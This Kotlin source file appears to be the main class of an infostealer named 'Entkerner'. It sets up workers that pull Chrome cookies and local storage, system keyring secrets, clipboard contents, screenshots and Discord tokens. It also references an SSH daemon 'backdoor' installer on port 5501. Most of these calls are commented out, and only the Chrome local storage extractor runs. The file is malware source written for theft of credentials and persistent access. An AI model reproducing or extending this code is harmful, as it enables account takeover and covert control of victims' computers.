package net.kerner.entkerner

import io.ktor.client.*
import io.ktor.client.engine.cio.*
import io.ktor.client.plugins.contentnegotiation.*
import io.ktor.client.plugins.cookies.*
import io.ktor.serialization.kotlinx.json.*
import kotlinx.coroutines.runBlocking
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import net.kerner.entkerner.abstract.AbstractBackdooringWorker
import net.kerner.entkerner.abstract.AbstractDataExtractor
import net.kerner.entkerner.abstract.get
import net.kerner.entkerner.extractors.chrome.ChromeBrowserLocalStorageWorker
import net.kerner.entkerner.extractors.chrome.ChromeCookieExtractor
import net.kerner.entkerner.extractors.chrome.ChromeLocalStorageExtractor
import net.kerner.entkerner.extractors.keyring.KeyRingSecret
import net.kerner.entkerner.extractors.keyring.SystemKeyringExtractor
import net.kerner.entkerner.extractors.screen.ScreenData
import net.kerner.entkerner.extractors.screen.ScreenExtractionWorker
import net.kerner.entkerner.extractors.standart.ClipboardExtractionWorker
import net.kerner.entkerner.model.ChromeCookie
import net.kerner.entkerner.model.SystemType
import kotlin.math.pow
import kotlin.math.sqrt

val system: SystemType
    get() = when(System.getProperty("os.name").lowercase()) {
        "windows " -> SystemType.WINDOWS
        "linux" -> SystemType.LINUX
        "xnu" -> SystemType.XNU // probably not working, need to test each of these
        else -> SystemType.WINDOWS // most common used on desktop
    }

class Entkerner {
    private val json = Json {
        ignoreUnknownKeys = true
        prettyPrint = true
    }
    private val httpClient = HttpClient(CIO) {
        install(ContentNegotiation) {
            json(json)
        }
        install(HttpCookies) {

        }
    }
    init {
        runBlocking {
            //val clipboard = runExtractor<String>(ClipboardExtractionWorker(httpClient))
            //val screenData = runExtractor<List<ScreenData>>(ScreenExtractionWorker(httpClient))
            //val keyRing = runExtractor<List<KeyRingSecret>>(SystemKeyringExtractor(httpClient))
            //val screenshot = runExtractor<List<String>>(ScreenScreenshotWorker(httpClient))
            //val ip = runExtractor<List<String>>(IPAddressExtractionWorker(httpClient))
            val localStorage = runExtractor<List<String>>(ChromeBrowserLocalStorageWorker(httpClient))
            //val chromeCookies = runExtractor<List<ChromeCookie>>(ChromeCookieExtractor(httpClient, keyRing))
            //val discordToken = runExtractor<List<DiscordToken>>(DiscordTokenExtractor(httpClient, system))
            //val discordData = runExtractor<List<DiscordData>>(DiscordDataWorker(httpClient, discordToken ?: listOf()))
            //runInstaller(SSHDaemonInstaller(httpClient, this@Entkerner, 5501))
        }
    }
    private suspend inline fun <reified V : Any> runExtractor(dataExtractor: AbstractDataExtractor<*>): V? {
        try {
            val file = dataExtractor.fileDirectories[system].toFile()
            val result = dataExtractor.run<V>(file)
            println(json.encodeToString(result))
            return result
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return null
    }

    private fun runInstaller(backdoorWorker: AbstractBackdooringWorker) {
        backdoorWorker.buildDoor(backdoorWorker.file[system].toFile())
    }
}

fun main() {
    Entkerner()
}